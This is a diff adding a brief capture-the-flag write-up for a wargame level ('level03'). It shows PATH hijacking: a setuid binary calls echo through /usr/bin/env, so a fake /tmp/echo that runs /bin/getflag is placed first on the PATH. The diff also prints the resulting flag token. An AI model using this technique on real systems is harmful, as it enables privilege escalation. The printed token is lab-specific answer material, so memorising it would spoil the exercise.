@@ -1,0 +1,15 @@
+strings level03
+
+this binary use echo for print
+and the binary find echo from /usr/bin/env
+Therefore, /usr/bin/env echo is an instruction to set the PATH , and then run echo, using the first directory in the PATH that contains the echo executable
+
+creat a fake echo:
+
+PATH=/tmp:$PATH
+
+echo '/bin/getflag' > /tmp/echo
+chmod +x /tmp/echo
+
+./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
